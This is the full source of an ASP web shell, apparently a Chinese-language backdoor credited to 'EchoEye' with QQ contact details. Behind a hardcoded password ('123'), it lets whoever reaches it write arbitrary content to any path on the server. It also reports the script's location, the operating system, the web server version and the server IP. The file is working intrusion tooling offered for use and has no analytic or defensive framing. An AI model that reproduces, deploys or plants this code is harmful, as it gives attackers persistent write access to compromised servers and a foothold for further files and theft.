<%
on error resume next
%>
<%
if request("pass")="123" then '在这修改密码
session("pw")="go"
end if
%>
<%if session("pw")<>"go" then %>
<%="<center><br><form action='' method='post'>"%>
<%="<input name='pass' type='password' size='10'> <input "%><%="type='submit' value='我要进去'></center>"%>
<%else%>
<%
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
%>
<%="yes"%>
<%else%>
<%="no"%>
<%
end if
err.clear
end if
da.close
%>
<%set da=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<%="<input type=text name=path>"%>
<%="<br>"%>
<%="当前文件路径:"&server.mappath(request.servervariables("script_name"))%>
<%="<br>"%>
<%="操作系统为:"&Request.ServerVariables("OS")%>
<%="<br>"%>
<%="WEB服务器版本为:"&Request.ServerVariables("SERVER_SOFTWARE")%>
<%="<br>"%>
<%="服务器的IP为:"&Request.ServerVariables("LOCAL_ADDR")%>
<%="<br>"%>
<%=""%>
<%="<textarea name=da cols=50 rows=10 width=30></textarea>"%>
<%="<br>"%>
<%="<input type=submit value=save>"%>
<%="</form>"%>
<%="<font face='黑体' color='red'> write by EchoEye QQ:232789935 </font>"%>
<%="<a href='tencent://message/?uin=331616608'>联系我</a>"%>
<%end if%>